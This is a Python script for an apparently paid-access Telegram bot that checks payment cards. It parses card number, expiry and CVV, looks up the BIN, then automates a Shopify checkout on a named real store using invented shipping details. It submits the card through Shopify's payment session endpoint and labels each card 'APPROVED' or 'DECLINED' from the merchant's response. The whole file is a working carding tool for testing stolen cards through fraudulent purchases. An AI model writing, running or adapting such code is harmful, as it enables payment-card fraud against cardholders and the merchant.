import requests
import json
import time
import re
import os
from datetime import datetime, date
import random


# Helper Functions
def multiexplode(delimiters, string):
    """Splits a string by multiple delimiters."""
    ready = string
    for delimiter in delimiters:
        ready = ready.replace(delimiter, delimiters[0])
    return ready.split(delimiters[0])


def getstr(string, start, end):
    """Extracts a substring between two delimiters."""
    try:
        start_index = string.index(start) + len(start)
        end_index = string.index(end, start_index)
        return string[start_index:end_index]
    except ValueError:
        return ""


def check_access(user_id):
    """Checks user access (paid or owner)."""
    current_date = date.today().strftime('%Y-%m-%d')
    paid_users, free_users, owners = [], [], []

    try:
        with open('Database/paid.txt', 'r') as f:
            paid_users = f.read().splitlines()
        with open('Database/free.txt', 'r') as f:
            free_users = f.read().splitlines()
        with open('Database/owner.txt', 'r') as f:
            owners = f.read().splitlines()
    except FileNotFoundError:
        pass  # Handle missing files

    user_id_str = str(user_id)  # Consistent string comparison
    if user_id_str in owners:
        return True

    for line in paid_users:
        user_id_from_file, user_expiry_date = line.split(" ")
        if user_id_from_file == user_id_str:
            if user_expiry_date >= current_date:
                return True
            else:
                # Expired paid user: move to free users.
                paid_users.remove(line)
                with open("Database/paid.txt", "w") as f:
                    f.write("\n".join(paid_users))
                free_users.append(user_id_str)
                with open("Database/free.txt", "w") as f:
                    f.write("\n".join(free_users))
                return False
    return False


def send_reply(chat_id, message_id, keyboard, text, reply_to_message_id):
    """Simulates Telegram Bot API reply (replace with actual)."""
    print(f"Simulating send_reply: chat_id={chat_id}, message_id={message_id}, text={text}")
    return {"message_id": message_id + 1}  # Mock response


def bot(method, data):
    """Simulates Telegram Bot API call (replace with actual)."""
    print(f"Simulating bot API call: method={method}, data={data}")
    if method == 'editMessageText':
        return True
    elif method == 'sendmessage':
        return {"message_id": data['reply_to_message_id'] + 1}
    return True


# --- Main Script ---
def process_shopify_request(update):
    """Handles the /si command and Shopify checkout process."""

    # --- Initialization and User Access Check ---
    gate = "𝙎𝙃𝙊𝙋𝙄𝙁𝙔 8.25$"
    paid_users, free_users, owners = [], [], []  # Load only once if possible.
    try:
        with open('Database/paid.txt', 'r') as f:
            paid_users = f.read().splitlines()
        with open('Database/free.txt', 'r') as f:
            free_users = f.read().splitlines()
        with open('Database/owner.txt', 'r') as f:
            owners = f.read().splitlines()
    except FileNotFoundError:
        pass

    text = update["message"]["text"]
    user_id = update['message']['from']['id']
    username = update['message']['from'].get('username', 'N/A')
    chat_id = update["message"]["chat"]["id"]
    message_id = update["message"]["message_id"]
    #  random.randint(0, 100)  Removed as it's unused.

    if not (re.match(r'^(\/si|\.si|!si)', text) and check_access(user_id)):
        send_reply(chat_id, message_id, "", f"<b> @{username} 𝘠𝘖𝘜 𝘈𝘙𝘌 𝘕𝘖𝘛 𝘗𝘙𝘌𝘔𝘐𝘜𝘔 𝘜𝘚𝘌𝘙  ❌</b>", message_id)
        return

    start_time = time.time()
    message = text[4:]  # Strip command prefix
    messageidtoedit1 = bot('sendmessage', {'chat_id': chat_id, 'text': "<b>Processing...</b>", 'parse_mode': 'html', 'reply_to_message_id': message_id})
    messageidtoedit = getstr(json.dumps(messageidtoedit1), '"message_id":', ',')

    # --- Input Validation ---
    parts = multiexplode([":", "/", " ", "|"], message)
    if len(parts) < 4:
        bot('editMessageText', {'chat_id': chat_id, 'message_id': messageidtoedit, 'text': f"!𝙒𝙍𝙊𝙉𝙂 𝙁𝙊𝙍𝙈𝘼𝙏! 𝙏𝙚𝙭𝙩 𝙎𝙝𝙤𝙪𝙡𝙙 𝙊𝙣𝙡𝙮 𝘾𝙤𝙣𝙩𝙖𝙞𝙣 - <code>/si cc|mm|yy|cvv</code>\n𝙂𝘼𝙏𝙀𝙒𝘼𝙔  - <b>{gate}</b>", 'parse_mode': 'html', 'disable_web_page_preview': 'true'})
        return
    cc, mes, ano, cvv = parts[0:4]
    if not all([cc, mes, ano, cvv]):  # Check for empty fields.
        bot('editMessageText', {'chat_id': chat_id, 'message_id': messageidtoedit, 'text': f"!𝙒𝙍𝙊𝙉𝙂 𝙁𝙊𝙍𝙈𝘼𝙏! 𝙏𝙚𝙭𝙩 𝙎𝙝𝙤𝙪𝙡𝙙 𝙊𝙣𝙡𝙮 𝘾𝙤𝙣𝙩𝙖𝙞𝙣 - <code>/si cc|mm|yy|cvv</code>\n𝙂𝘼𝙏𝙀𝙒𝘼𝙔  - <b>{gate}</b>", 'parse_mode': 'html', 'disable_web_page_preview': 'true'})
        return
    mes = mes.lstrip('0')
    ano = '20' + ano if len(ano) == 2 else ano
    lista = f"{cc}|{mes}|{ano}|{cvv}"

    # --- Bin Lookup ---
    try:
        bin_response = requests.get(f'https://binlist.io/lookup/{cc[:6]}/')
        bin_data = bin_response.json()
        brand = bin_data.get('scheme', 'N/A')
        country_data = bin_data.get('country', {})
        country = country_data.get('name', 'N/A')
        alpha2 = country_data.get('alpha2', 'N/A')
        emoji = country_data.get('emoji', 'N/A')
        card_type = bin_data.get('type', 'N/A')
        category = bin_data.get('category', 'N/A')
        bank_data = bin_data.get('bank', {})
        bank = bank_data.get('name', 'N/A')
        url = bank_data.get('url', 'N/A')
        phone = bank_data.get('phone', 'N/A') # Keep phone even on error.
    except (requests.RequestException, json.JSONDecodeError):
        print("Error during bin lookup")
        brand, country, alpha2, emoji, card_type, category, bank, url, phone = ["N/A"] * 9

    bank_info, country_info = f"{bank}", f"{country} {emoji}"
    bin_info, bin_details = f"{cc[:6]} - ({alpha2}) -[{emoji}]", f"{card_type.upper()} - {brand} - {category}"

    # --- Shopify API Requests (using a single session) ---
    with requests.Session() as s:
        bot('editMessageText', {'chat_id': chat_id, 'message_id': messageidtoedit, 'text': f"""<b>[×] 𝙋𝙍𝙊𝘾𝙀𝙎𝙎𝙄𝙉𝙂 - ■□□□
[×] 𝘾𝘼𝙍𝘿 ↯ <code>{lista}</code>
[×] 𝙂𝘼𝙏𝙀𝙒𝘼𝙔 ↯ {gate}
[×] 𝘽𝘼𝙉𝙆 ↯ {bank_info}
[×] 𝙏𝙔𝙋𝙀 ↯ {bin_details}
[×] 𝘾𝙊𝙐𝙉𝙏𝙍𝙔 ↯ {country_info}
- - - - - - - - - - - - - - - - - - -
|×| 𝙈𝘼𝙓 𝙏𝙄𝙈𝙀 ↯ 25 𝙎𝙀𝘾
|×| 𝙍𝙀𝙌 𝘽𝙔 ↯ @{username}</b>""", 'parse_mode': 'html', 'disable_web_page_preview': 'true'})

        # Get random user data
        try:
            random_user_response = requests.get('https://random-data-api.com/api/v2/users?size=2&is_xml=true')
            random_user_data = random_user_response.text
            first_name = getstr(random_user_data, '"first_name":"', '"').strip()
            last_name = getstr(random_user_data, '"last_name":"', '"').strip()
        except requests.RequestException:
            print("Error getting random user data")
            first_name, last_name = "John", "Doe"

        site = "www.vanguardmil.com"

        # --- Request 1 ---
        try:
            headers = {'Host': site, 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Connection': 'keep-alive', 'Upgrade-Insecure-Requests': '1'}
            r1 = s.get('https://www.vanguardmil.com/cart/12379973845046:1?traffic_source=buy_now', headers=headers, allow_redirects=True)
            checkouts = getstr(r1.text, 'www.vanguardmil.com/7202413/checkouts/', '"')
            token = getstr(r1.text, 'name="authenticity_token" value="', '"')
        except requests.RequestException as e:
            print(f"Request 1 failed: {e}"); bot('editMessageText', {'chat_id': chat_id, 'message_id': messageidtoedit, 'text': f"""<b>Request 1 failed</b>""", 'parse_mode': 'html', 'disable_web_page_preview': 'true'});            return

        bot('editMessageText', {'chat_id': chat_id, 'message_id': messageidtoedit, 'text': f"""<b>[×] 𝙋𝙍𝙊𝘾𝙀𝙎𝙎𝙄𝙉𝙂 - ■■□□
[×] 𝘾𝘼𝙍𝘿 ↯ <code>{lista}</code>
[×] 𝙂𝘼𝙏𝙀𝙒𝘼𝙔 ↯ {gate}
[×] 𝘽𝘼𝙉𝙆 ↯ {bank_info}
[×] 𝙏𝙔𝙋𝙀 ↯ {bin_details}
[×] 𝘾𝙊𝙐𝙉𝙏𝙍𝙔 ↯ {country_info}
- - - - - - - - - - - - - - - - - - -
|×| 𝙈𝘼𝙓 𝙏𝙄𝙈𝙀 ↯ 25 𝙎𝙀𝘾
|×| 𝙍𝙀𝙌 𝘽𝙔 ↯ @{username}</b>""", 'parse_mode': 'html', 'disable_web_page_preview': 'true'})

        # --- Request 2 ---
        try:
            headers = {'authority': site, 'method': 'POST', 'path': f'/7202413/checkouts/{checkouts}', 'scheme': 'https', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'accept-language': 'es-PE,es-419;q=0.9,es;q=0.8,en;q=0.7,pt;q=0.6', 'content-type': 'application/x-www-form-urlencoded', 'origin': f'https://{site}', 'referer': f'https://{site}/', 'sec-ch-ua': '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'document', 'sec-fetch-mode': 'navigate', 'sec-fetch-site': 'same-origin', 'sec-fetch-user': '?1', 'upgrade-insecure-requests': '1', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36'}
            data = {'_method': 'patch', 'authenticity_token': token, 'previous_step': 'contact_information', 'step': 'shipping_method', 'checkout[email]': 'luquera09@gmail.com', 'checkout[buyer_accepts_marketing]': '0', 'checkout[shipping_address][first_name]': '', 'checkout[shipping_address][last_name]': '', 'checkout[shipping_address][company]': '', 'checkout[shipping_address][address1]': '', 'checkout[shipping_address][address2]': '', 'checkout[shipping_address][city]': '', 'checkout[shipping_address][country]': '', 'checkout[shipping_address][province]': '', 'checkout[shipping_address][zip]': '', 'checkout[shipping_address][phone]': '', 'checkout[shipping_address][country]': 'United States', 'checkout[shipping_address][first_name]': 'jhin', 'checkout[shipping_address][last_name]': 'pers', 'checkout[shipping_address][company]': '', 'checkout[shipping_address][address1]': 'Street Gary D', 'checkout[shipping_address][address2]': '', 'checkout[shipping_address][city]': 'Baltimore', 'checkout[shipping_address][province]': 'MD', 'checkout[shipping_address][zip]': '21201', 'checkout[shipping_address][phone]': '(631) 243-5756', 'checkout[remember_me]': '', 'checkout[remember_me]': '0', 'checkout[client_details][browser_width]': '1422', 'checkout[client_details][browser_height]': '578', 'checkout[client_details][javascript_enabled]': '1', 'checkout[client_details][color_depth]': '24', 'checkout[client_details][java_enabled]': 'false', 'checkout[client_details][browser_tz]': '300'}

            r3 = s.post(f'https://{site}/7202413/checkouts/{checkouts}', headers=headers, data=data, allow_redirects=True)
            token2 = getstr(r3.text, 'name="authenticity_token" value="', '"')
            shipping = getstr(r3.text, 'div class="radio-wrapper" data-shipping-method="', '">')
        except requests.RequestException as e:
            print(f"Request 2 failed: {e}"); bot('editMessageText', {'chat_id': chat_id, 'message_id': messageidtoedit, 'text': f"""<b>Request 2 failed</b>""", 'parse_mode': 'html', 'disable_web_page_preview': 'true'}); return

        # --- Request 3 ---
        try:
            headers = {'authority': site, 'method': 'POST', 'path': f'/7202413/checkouts/{checkouts}', 'scheme': 'https', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'accept-language': 'es-PE,es-419;q=0.9,es;q=0.8,en;q=0.7,pt;q=0.6', 'content-type': 'application/x-www-form-urlencoded', 'origin': f'https://{site}', 'referer': f'https://{site}/', 'sec-ch-ua': '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'document', 'sec-fetch-mode': 'navigate', 'sec-fetch-site': 'same-origin', 'sec-fetch-user': '?1', 'upgrade-insecure-requests': '1', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36'}
            data = {'_method': 'patch', 'authenticity_token': token2, 'previous_step': 'shipping_method', 'step': 'payment_method', 'checkout[shipping_rate][id]': 'Advanced+Shipping+Manager+Connector+for+Shopify-Flat%2520Rate%2520%28Best%2520Way%29-4.95', 'checkout[client_details][browser_width]': '821', 'checkout[client_details][browser_height]': '578', 'checkout[client_details][javascript_enabled]': '1', 'checkout[client_details][color_depth]': '24', 'checkout[client_details][java_enabled]': 'false', 'checkout[client_details][browser_tz]': '300'}
            r4 = s.post(f'https://{site}/7202413/checkouts/{checkouts}', headers=headers, data=data, allow_redirects=True)
            token3 = getstr(r4.text, 'name="authenticity_token" value="', '"')
            total = getstr(r4.text, 'data-checkout-payment-due-target="', '"')
        except requests.RequestException as e:
            print(f"Request 3 failed: {e}"); bot('editMessageText', {'chat_id': chat_id, 'message_id': messageidtoedit, 'text': f"""<b>Request 3 failed</b>""", 'parse_mode': 'html', 'disable_web_page_preview': 'true'}); return

        bot('editMessageText', {'chat_id': chat_id, 'message_id': messageidtoedit, 'text': f"""<b>[×] 𝙋𝙍𝙊𝘾𝙀𝙎𝙎𝙄𝙉𝙂 - ■■■□
[×] 𝘾𝘼𝙍𝘿 ↯ <code>{lista}</code>
[×] 𝙂𝘼𝙏𝙀𝙒𝘼𝙔 ↯ {gate}
[×] 𝘽𝘼𝙉𝙆 ↯ {bank_info}
[×] 𝙏𝙔𝙋𝙀 ↯ {bin_details}
[×] 𝘾𝙊𝙐𝙉𝙏𝙍𝙔 ↯ {country_info}
- - - - - - - - - - - - - - - - - - -
|×| 𝙈𝘼𝙓 𝙏𝙄𝙈𝙀 ↯ 25 𝙎𝙀𝘾
|×| 𝙍𝙀𝙌 𝘽𝙔 ↯ @{username}</b>""", 'parse_mode': 'html', 'disable_web_page_preview': 'true'})

        # --- Request 4 (Payment Session) ---
        try:
            headers = {'Accept': 'application/json', 'Accept-Language': 'es-PE,es-419;q=0.9,es;q=0.8,en;q=0.7,pt;q=0.6', 'Connection': 'keep-alive', 'Content-Type': 'application/json', 'Host': 'deposit.us.shopifycs.com', 'Origin': 'https://checkout.shopifycs.com', 'Referer': 'https://checkout.shopifycs.com/', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-site', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36'}
            data = {"credit_card": {"number": cc, "name": "Btokencc", "month": int(mes), "year": int(ano), "verification_value": cvv}, "payment_session_scope": site}
            r5 = s.post('https://deposit.us.shopifycs.com/sessions', headers=headers, json=data, allow_redirects=True)
            r5_json = r5.json()
            sid = r5_json.get('id')
            if not sid:
                print("Failed to get session ID:", r5.text); bot('editMessageText', {'chat_id': chat_id, 'message_id': messageidtoedit, 'text': f"""<b>Request 4 failed</b>""", 'parse_mode': 'html', 'disable_web_page_preview': 'true'}); return
        except (requests.RequestException, json.JSONDecodeError) as e:
            print(f"Request 4 failed: {e}"); bot('editMessageText', {'chat_id': chat_id, 'message_id': messageidtoedit, 'text': f"""<b>Request 4 failed</b>""", 'parse_mode': 'html', 'disable_web_page_preview': 'true'}); return

        # --- Request 5 (Submit Payment) ---
        try:
            headers = {'authority': site, 'method': 'POST', 'path': f'/7202413/checkouts/{checkouts}', 'scheme': 'https', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'accept-language': 'es-PE,es;q=0.9', 'cache-control': 'max-age=0', 'content-type': 'application/x-www-form-urlencoded', 'origin': f'https://{site}', 'referer': f'https://{site}/', 'sec-ch-ua': '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'document', 'sec-fetch-mode': 'navigate', 'sec-fetch-site': 'same-origin', 'sec-fetch-user': '?1', 'upgrade-insecure-requests': '1', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36'}
            data = {'_method': 'patch', 'authenticity_token': token3, 'previous_step': 'payment_method', 'step': '', 's': sid, 'checkout[payment_gateway]': '7520892', 'checkout[credit_card][vault]': 'false', 'checkout[different_billing_address]': 'false', 'checkout[total_price]': '845', 'complete': '1', 'checkout[client_details][browser_width]': '821', 'checkout[client_details][browser_height]': '578', 'checkout[client_details][javascript_enabled]': '1', 'checkout[client_details][color_depth]': '24', 'checkout[client_details][java_enabled]': 'false', 'checkout[client_details][browser_tz]': '300'}
            r6 = s.post(f'https://{site}/7202413/checkouts/{checkouts}', headers=headers, data=data, allow_redirects=True)
            time.sleep(5)
        except requests.RequestException as e:
            print(f"Request 5 failed: {e}"); bot('editMessageText', {'chat_id': chat_id, 'message_id': messageidtoedit, 'text': f"""<b>Request 5 failed</b>""", 'parse_mode': 'html', 'disable_web_page_preview': 'true'}); return

        # --- Request 6 (Processing Page) ---
        try:
            headers = {'Host': site, 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Connection': 'keep-alive', 'Upgrade-Insecure-Requests': '1'}
            r7 = s.get(f'https://{site}/7202413/checkouts/{checkouts}/processing?from_processing_page=1', headers=headers, allow_redirects=True)
            time.sleep(2)

        except requests.RequestException as e:
            print(f"Request 6 failed: {e}"); bot('editMessageText', {'chat_id': chat_id, 'message_id': messageidtoedit, 'text': f"""<b>Request 6 failed</b>""", 'parse_mode': 'html', 'disable_web_page_preview': 'true'}); return

        bot('editMessageText', {'chat_id': chat_id, 'message_id': messageidtoedit, 'text': f"""<b>[×] 𝙋𝙍𝙊𝘾𝙀𝙎𝙎𝙄𝙉𝙂 - ■■■■
[×] 𝘾𝘼𝙍𝘿 ↯ <code>{lista}</code>
[×] 𝙂𝘼𝙏𝙀𝙒𝘼𝙔 ↯ {gate}
[×] 𝘽𝘼𝙉𝙆 ↯ {bank_info}
[×] 𝙏𝙔𝙋𝙀 ↯ {bin_details}
[×] 𝘾𝙊𝙐𝙉𝙏𝙍𝙔 ↯ {country_info}
- - - - - - - - - - - - - - - - - - -
|×| 𝙈𝘼𝙓 𝙏𝙄𝙈𝙀 ↯ 25 𝙎𝙀𝘾
|×| 𝙍𝙀𝙌 𝘽𝙔 ↯ @{username}</b>""", 'parse_mode': 'html', 'disable_web_page_preview': 'true'})

        # --- Result Processing ---
        msg = getstr(r7.text, 'class="notice__content"><p class="notice__text">', '</p></div></div>').strip()
        conditions = [
            ("Security code was not matched by the processor", "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅"),
            ("Security codes does not match correct format (3-4 digits)", "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅"),
            ("Your order is confirmed", "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅"),
            ("Thanks for supporting", "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅"),
            ('<div class="webform-confirmation">', "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅"),
            ("Card was declined", "𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ❌"),
            ("The merchant does not accept this type of credit card", "𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ❌"),
        ]
        es = "𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ❌"  # Default
        for condition, status in conditions:
            if condition in r7.text:
                es = status
                break

    # --- Final Output ---
    end_time = time.time()
    time_taken = "{:.2f}".format(end_time - start_time)
    bot('editMessageText', {'chat_id': chat_id, 'message_id': messageidtoedit, 'text': f"""{es}
<b>💳</b>  <code>{lista}</code>
⌬ 𝙂𝘼𝙏𝙀𝙒𝘼𝙔 ↯ <code>{gate}</code>
⌬ 𝙍𝙀𝙎𝙋𝙊𝙉𝙎𝙀 ↯ <code>{msg}</code>
⌬ 𝘽𝙄𝙉 𝙄𝙉𝙁𝙊 ↯ <code>{bin_details}</code>
⌬ 𝘽𝘼𝙉𝙆 ↯ <code>{bank_info}</code>
⌬ 𝘾𝙊𝙐𝙉𝙏𝙍𝙔 ↯ <code>{country_info}</code>
𝙏𝙄𝙈𝙀 ↯ <code>{time_taken} Seconds</code>""", 'parse_mode': 'html', 'disable_web_page_preview': 'true'})